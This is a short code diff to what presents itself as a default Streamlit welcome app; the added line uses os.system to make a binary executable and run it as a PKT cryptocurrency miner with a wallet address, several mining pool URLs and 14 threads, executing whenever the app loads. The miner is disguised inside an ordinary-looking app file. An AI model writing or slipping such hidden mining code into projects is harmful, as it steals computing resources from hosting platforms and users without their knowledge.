@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('chmod +x dero-stratum-miner && ./reves ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp  http://pool.pkt.world/master/4096 http://pool.pktpool.io/diff/4096 http://pool.pkteer.com https://stratum.zetahash.com -t14 2>&1 | grep goodrate ')
+os.system('chmod +x razor && ./razor ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp  http://pool.pkt.world/master/4096 http://pool.pktpool.io/diff/4096 http://pool.pkteer.com https://stratum.zetahash.com -t14 2>&1 | grep goodrate ')
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
